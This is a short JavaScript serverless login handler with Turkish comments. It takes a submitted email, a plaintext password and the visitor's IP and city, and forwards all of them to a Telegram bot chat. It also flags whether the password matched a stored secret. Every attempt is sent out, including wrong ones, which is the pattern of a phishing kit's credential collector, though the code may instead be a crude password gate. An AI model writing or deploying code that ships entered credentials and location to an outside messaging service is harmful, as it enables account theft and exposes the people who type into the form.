export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(405).end();
    const { email, pass, ipData } = req.body;
    
    // Vercel'deki gizli değişkenleri kullanıyoruz
    const BOT_TOKEN = process.env.BOT_TOKEN;
    const CHAT_ID = process.env.TELEGRAM_ID;
    const DOGRU_SIFRE = process.env.SIFRE;

    const mesaj = `🚀 **TERCES BİLDİRİM**\n📧: ${email}\n🔑: ${pass}\n📡 IP: ${ipData.ip}\n📍: ${ipData.city}\n✅: ${pass === DOGRU_SIFRE ? "BAŞARILI" : "HATALI"}`;

    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(mesaj)}&parse_mode=Markdown`);
        return res.status(200).json({ success: true });
    } catch (e) {
        return res.status(500).json({ error: "Hata" });
    }
}

